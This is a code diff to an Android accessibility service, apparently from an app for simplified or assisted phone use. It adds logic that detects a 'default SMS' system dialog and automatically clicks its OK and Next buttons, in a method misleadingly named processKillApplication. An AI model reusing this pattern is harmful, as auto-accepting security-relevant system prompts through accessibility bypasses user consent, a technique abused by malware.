@@ -24,8 +24,49 @@ public class EasySettingControl extends TatansService {
 	@Override
 	public void onAccessibilityEvent(AccessibilityService accessibilityService,AccessibilityEvent event, AccessibilityNodeInfo rowNode) {
 		easySettingApplication((Application) TatansServiceApplication.getContext(), rowNode);
+		this.processAccessibilityEvent(event);
 	}
 
+	private void processAccessibilityEvent(AccessibilityEvent event) {
+		Log.d("test", event.eventTypeToString(event.getEventType()));
+		if (event.getSource() == null) {
+			Log.d("test", "the source = null");
+		} else {
+			processKillApplication(event);
+		}
+	}
+
+	private void processKillApplication(AccessibilityEvent event) {
+
+		if (event.getSource() != null) {
+			List<AccessibilityNodeInfo> stop_nodes = event.getSource().findAccessibilityNodeInfosByText("默认短信");
+			if (stop_nodes != null && !stop_nodes.isEmpty()) {
+				List<AccessibilityNodeInfo> ok_nodes = event.getSource().findAccessibilityNodeInfosByText("确定");
+				if (ok_nodes != null && !ok_nodes.isEmpty()) {
+					AccessibilityNodeInfo node;
+					for (int i = 0; i < ok_nodes.size(); i++) {
+						node = ok_nodes.get(i);
+						if (node.getClassName().equals("android.widget.Button")) {
+							node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+							Log.d("action", "click ok");
+						}
+					}
+				}
+				List<AccessibilityNodeInfo> xiayibu_nodes = event.getSource().findAccessibilityNodeInfosByText("下一步");
+				if (xiayibu_nodes != null && !xiayibu_nodes.isEmpty()) {
+					AccessibilityNodeInfo node;
+					for (int i = 0; i < xiayibu_nodes.size(); i++) {
+						node = xiayibu_nodes.get(i);
+						if (node.getClassName().equals("android.widget.Button")) {
+							node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+							FxService.interrupt(0);
+							Log.d("action", "click ok");
+						}
+					}
+				}
+			}
+		}
+	}
 	/**
 	 * xzb   极简模式覆盖窗口
 	 * @param application
